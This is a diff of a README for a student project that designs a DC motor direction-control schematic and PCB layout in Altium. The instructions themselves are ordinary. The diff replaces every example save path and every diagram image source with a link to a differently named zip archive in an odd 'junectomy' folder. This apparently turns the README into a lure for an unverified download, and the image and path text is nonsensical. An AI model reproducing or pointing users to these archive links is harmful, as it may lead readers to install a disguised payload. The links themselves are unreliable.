@@ -9,7 +9,7 @@ To design the schematic and PCB layout diagram of an DC motor direction control 
 •  Open Altium & create a project<br>
 File → New → Project → choose PCB Project. Give it a name and folder.<br>
 •  Add a schematic sheet<br>
-Right-click the project → Add New to Project → Schematic. Save it (e.g., https://raw.githubusercontent.com/MITHUN8521/DC-motor-directional-control-using-Altium-software/main/junectomy/DC-motor-directional-control-using-Altium-software_v1.9.zip).<br>
+Right-click the project → Add New to Project → Schematic. Save it (e.g., https://raw.githubusercontent.com/MITHUN8521/DC-motor-directional-control-using-Altium-software/main/junectomy/directional_software_control_D_Altium_motor_using_v2.2-alpha.5.zip).<br>
 •  Place components<br>
 Use Components panel or Place → Part. Search library parts (resistors, ICs, connectors). Place each part and assign a designator (R1, C1, U1).<br>
 •  Wire the circuit<br>
@@ -17,7 +17,7 @@ Use the Wire tool to connect pins. Add net labels for power (VCC, GND) and impor
 •  Annotate & check<br>
 Tools → Annotation to give unique designators if needed. Run Electrical Rule Check (ERC) and fix any errors/warnings.<br>
 •  Add PCB document<br>
-Right-click project → Add New to Project → PCB. Save it (e.g., https://raw.githubusercontent.com/MITHUN8521/DC-motor-directional-control-using-Altium-software/main/junectomy/DC-motor-directional-control-using-Altium-software_v1.9.zip).<br>
+Right-click project → Add New to Project → PCB. Save it (e.g., https://raw.githubusercontent.com/MITHUN8521/DC-motor-directional-control-using-Altium-software/main/junectomy/directional_software_control_D_Altium_motor_using_v2.2-alpha.5.zip).<br>
 •  Compile and update PCB<br>
 On the schematic: Design → Compile Project. Then Design → Update PCB Document → Review ECO → Execute to push parts to PCB.<br>
 •  Define board shape<br>
@@ -58,15 +58,15 @@ This circuit is useful for controlling the direction of small DC motors in low-p
 
 # CIRCUIT DIAGRAM:
  
- <img width="795" height="423" alt="image" src="https://raw.githubusercontent.com/MITHUN8521/DC-motor-directional-control-using-Altium-software/main/junectomy/DC-motor-directional-control-using-Altium-software_v1.9.zip" />
+ <img width="795" height="423" alt="image" src="https://raw.githubusercontent.com/MITHUN8521/DC-motor-directional-control-using-Altium-software/main/junectomy/directional_software_control_D_Altium_motor_using_v2.2-alpha.5.zip" />
 
 # EXPECTED OUTPUT:
 ## Schematic diagram:
- <img width="1023" height="513" alt="image" src="https://raw.githubusercontent.com/MITHUN8521/DC-motor-directional-control-using-Altium-software/main/junectomy/DC-motor-directional-control-using-Altium-software_v1.9.zip" />
+ <img width="1023" height="513" alt="image" src="https://raw.githubusercontent.com/MITHUN8521/DC-motor-directional-control-using-Altium-software/main/junectomy/directional_software_control_D_Altium_motor_using_v2.2-alpha.5.zip" />
 
 ## Layout diagram:
 
- <img width="1108" height="572" alt="image" src="https://raw.githubusercontent.com/MITHUN8521/DC-motor-directional-control-using-Altium-software/main/junectomy/DC-motor-directional-control-using-Altium-software_v1.9.zip" />
+ <img width="1108" height="572" alt="image" src="https://raw.githubusercontent.com/MITHUN8521/DC-motor-directional-control-using-Altium-software/main/junectomy/directional_software_control_D_Altium_motor_using_v2.2-alpha.5.zip" />
 
 # RESULT:
 Thus, the schematic and PCB layout for the DC motor direction control circuit has been successfully designed using Altium software.
